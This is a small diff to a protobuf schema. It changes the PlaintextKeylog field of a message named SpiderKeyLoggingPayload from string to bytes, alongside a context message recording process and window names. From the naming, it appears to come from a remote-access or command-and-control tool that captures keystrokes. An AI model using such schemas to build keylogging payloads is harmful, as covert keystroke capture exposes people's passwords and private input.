@@ -5,6 +5,6 @@ message SpiderKeyLoggingPayload {
         string ProcessName = 1;
         string WindowsName = 2;
     }
-    string PlaintextKeylog = 1;
+    bytes PlaintextKeylog = 1;
     SpiderKeyLoggingContextPayload Context = 2;
 }
